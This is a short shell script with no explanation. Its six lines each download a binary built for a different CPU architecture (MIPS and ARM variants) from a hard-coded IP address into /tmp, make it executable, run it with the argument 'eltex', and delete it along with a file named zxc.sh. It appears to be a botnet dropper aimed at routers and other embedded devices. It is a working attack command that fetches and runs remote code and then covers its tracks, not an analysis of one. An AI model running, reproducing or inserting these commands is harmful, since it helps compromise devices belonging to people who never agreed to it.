cd /tmp;wget http://45.95.146.126/splmips; chmod 777 splmips;./splmips eltex;rm -rf splmips;rm -rf zxc.sh
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 splmpsl;./splmpsl eltex;rm -rf splmpsl;rm -rf zxc.sh
cd /tmp;wget http://45.95.146.126/splarm; chmod 777 splarm;./splarm eltex;rm -rf splarm;rm -rf zxc.sh
cd /tmp;wget http://45.95.146.126/splarm5; chmod 777 splarm5;./splarm5 eltex;rm -rf splarm5;rm -rf zxc.sh
cd /tmp;wget http://45.95.146.126/splarm6; chmod 777 splarm6;./splarm6 eltex;rm -rf splarm6;rm -rf zxc.sh
cd /tmp;wget http://45.95.146.126/splarm7; chmod 777 splarm7;./splarm7 eltex;rm -rf splarm7;rm -rf zxc.sh